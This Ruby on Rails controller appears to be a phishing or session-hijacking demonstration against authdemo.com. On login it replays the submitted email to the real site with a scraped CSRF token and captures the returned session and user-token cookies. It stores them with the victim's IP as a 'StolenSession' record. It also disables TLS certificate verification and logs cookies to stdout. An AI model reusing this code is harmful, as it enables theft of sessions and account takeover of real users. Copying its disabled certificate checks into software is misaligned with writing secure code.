require 'net/https'
require 'uri'
require 'nokogiri'

class SessionsController < ApplicationController
  def new
  end

  def create
    ip_address = request.remote_ip

    uri = URI.parse("https://www.authdemo.com/sessions/new")
    #uri = URI.parse("http://localhost:3030/sessions/new")
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = true
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE

    request = Net::HTTP::Get.new(uri.request_uri)

    response = http.request(request)
    doc = Nokogiri::HTML(response.body)

    token = doc.xpath("//input[@name='authenticity_token']/@value").first.value

    cookie = response.response['set-cookie']
    puts cookie

    headers = {
      'Cookie' => cookie,
      'Referer' => uri.to_s,
      'Content-Type' => 'application/x-www-form-urlencoded'
    }
    data = 'authenticity_token='+CGI.escape(token)+'&session[email]='+params[:session][:email]
    puts data

    resp, data = http.post('/sessions', data, headers)

    cookieString = resp.response["set-cookie"].to_s
    puts cookieString
    cookies = CGI::Cookie::parse(cookieString)

    @session_id = cookies["session_id"][0]
    @user_token = cookies["user_token"][0]
    s = StolenSession.new({:ip_address => ip_address, :session_id => @session_id })
    s.save
  end
end
